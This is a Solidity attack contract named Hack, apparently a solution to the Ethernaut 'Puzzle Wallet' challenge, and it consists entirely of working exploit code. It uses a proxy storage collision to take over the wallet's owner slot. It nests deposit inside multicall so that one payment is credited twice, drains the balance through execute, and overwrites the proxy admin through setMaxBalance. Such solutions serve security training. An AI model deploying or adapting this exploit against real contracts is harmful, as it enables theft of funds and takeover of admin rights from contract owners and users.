// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPuzzleProxy {
    function proposeNewAdmin(address newAdmin) external;
}

interface IPuzzleWallet {
    function addToWhitelist(address addr) external;
    function multicall(bytes[] calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Hack {
    IPuzzleProxy public proxy;
    IPuzzleWallet public wallet;
    address public immutable receiver;

    constructor(address payable proxyAddr) payable {
        proxy = IPuzzleProxy(proxyAddr);
        wallet = IPuzzleWallet(proxyAddr);
        receiver = address(this);
    }

    function attack(address _newAdmin) external payable {
        proxy.proposeNewAdmin(address(this));
        wallet.addToWhitelist(address(this));

        bytes[] memory inner = new bytes[](1);
		bytes[] memory data = new bytes[](3);

        inner[0] = abi.encodeWithSelector(bytes4(keccak256("deposit()")));

        data[0] = abi.encodeWithSelector(bytes4(keccak256("deposit()")));
        data[1] = abi.encodeWithSelector(bytes4(keccak256("multicall(bytes[])")), inner);
        data[2] = abi.encodeWithSelector(
            bytes4(keccak256("execute(address,uint256,bytes)")),
            receiver,
            0.002 ether,
            bytes("")
        );

        wallet.multicall{value: msg.value}(data);
        wallet.setMaxBalance(uint256(uint160(_newAdmin)));
    }

    receive() external payable {}
}
